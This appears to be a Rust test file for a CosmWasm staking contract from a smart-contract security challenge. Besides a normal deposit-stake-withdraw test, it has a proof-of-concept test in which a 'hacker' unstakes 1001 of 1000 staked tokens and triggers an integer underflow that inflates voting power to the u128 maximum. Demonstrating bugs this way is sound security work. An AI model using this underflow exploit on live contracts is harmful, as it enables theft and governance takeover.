#[cfg(test)]
pub mod tests {
    use crate::{
        contract::{DENOM, LOCK_PERIOD},
        msg::{ExecuteMsg, InstantiateMsg, QueryMsg},
        state::UserInfo,
    };
    use cosmwasm_std::{coin, Addr, Empty, Uint128};
    use cw_multi_test::{App, Contract, ContractWrapper, Executor};

    pub fn challenge_contract() -> Box<dyn Contract<Empty>> {
        let contract = ContractWrapper::new(
            crate::contract::execute,
            crate::contract::instantiate,
            crate::contract::query,
        );
        Box::new(contract)
    }

    pub const USER: &str = "user";
    pub const ADMIN: &str = "admin";

    pub fn proper_instantiate() -> (App, Addr) {
        let mut app = App::default();
        let cw_template_id = app.store_code(challenge_contract());

        // init contract
        let msg = InstantiateMsg {};
        let contract_addr = app
            .instantiate_contract(
                cw_template_id,
                Addr::unchecked(ADMIN),
                &msg,
                &[],
                "test",
                None,
            )
            .unwrap();

        (app, contract_addr)
    }

    pub fn mint_tokens(mut app: App, recipient: String, amount: Uint128) -> App {
        app.sudo(cw_multi_test::SudoMsg::Bank(
            cw_multi_test::BankSudo::Mint {
                to_address: recipient,
                amount: vec![coin(amount.u128(), DENOM)],
            },
        ))
        .unwrap();
        app
    }

    #[test]
    fn basic_flow() {
        let (mut app, contract_addr) = proper_instantiate();

        let amount = Uint128::new(1_000);

        app = mint_tokens(app, USER.to_string(), amount);
        let sender = Addr::unchecked(USER);

        // deposit funds
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            sender.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(amount.u128(), DENOM)],
        )
        .unwrap();

        // no funds left
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // query user
        let msg = QueryMsg::GetUser {
            user: (&USER).to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, amount);

        // cannot stake more than deposited
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128() + 1,
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // normal stake
        let msg = ExecuteMsg::Stake {
            lock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // query voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, amount.u128());

        // cannot unstake before maturity
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // cannot withdraw while staked
        let msg = ExecuteMsg::Withdraw { amount };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap_err();

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // normal unstake
        let msg = ExecuteMsg::Unstake {
            unlock_amount: amount.u128(),
        };
        app.execute_contract(sender.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // no more voting power
        let msg = QueryMsg::GetVotingPower {
            user: (&USER).to_string(),
        };
        let voting_power: u128 = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(voting_power, 0_u128);

        // normal withdraw
        let msg = ExecuteMsg::Withdraw { amount };
        app.execute_contract(sender, contract_addr, &msg, &[])
            .unwrap();

        // funds are received
        let balance = app.wrap().query_balance(USER, DENOM).unwrap().amount;
        assert_eq!(balance, amount);
    }


    // Run `cargo test --release`
    #[test]
    fn runneth_under() {
        let (mut app, contract_addr) = proper_instantiate();

        // Create "hacker"
        let hacker = Addr::unchecked("hacker");

        // Give hacker 1000 tokens
        app = mint_tokens(app, hacker.to_string(), Uint128::from(1000u128));

        // Hacker deposits 1000 tokens
        let msg = ExecuteMsg::Deposit {};
        app.execute_contract(
            hacker.clone(),
            contract_addr.clone(),
            &msg,
            &[coin(1000u128, DENOM)],
        )
        .unwrap();

        // Hacker has 0 tokens left
        let balance = app.wrap().query_balance("hacker", DENOM).unwrap().amount;
        assert_eq!(balance, Uint128::zero());

        // Hacker has 1000 tokens deposited 
        let msg = QueryMsg::GetUser {
            user: "hacker".to_string(),
        };
        let user: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user.total_tokens, Uint128::from(1000u128));

        // Hacker stakes 1000 tokens
        let ex_msg = r#"{"stake":{"lock_amount":"1000"}}"#;
        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
        app.execute_contract(hacker.clone(), contract_addr.clone(), &msg, &[])
            .unwrap();

        // Verify 1000 tokens were staked
        let msg = QueryMsg::GetUser { 
            user: "hacker".to_string()
        };
        let user_info: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        assert_eq!(user_info.voting_power, 1000u128);
        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));

        // fast forward time
        app.update_block(|block| {
            block.time = block.time.plus_seconds(LOCK_PERIOD);
        });

        // Hacker unstakes 1001
        let ex_msg = r#"{"unstake":{"unlock_amount":"1001"}}"#;
        let msg: schemars::_serde_json::Value = schemars::_serde_json::from_str(ex_msg).unwrap();
        app
            .execute_contract(Addr::unchecked("hacker"), contract_addr.clone(), &msg, &[])
            .unwrap();

        // Check Hacker's info after trying to unstake 1001 tokens with only 1000 staked
        let msg = QueryMsg::GetUser {
            user: "hacker".to_string(),
        };
        let user_info: UserInfo = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &msg)
            .unwrap();
        
        // This is good!
        assert_eq!(user_info.total_tokens, Uint128::from(1000u128));
        // This is not!
        assert_eq!(user_info.voting_power, 340282366920938463463374607431768211455u128);
    }

}
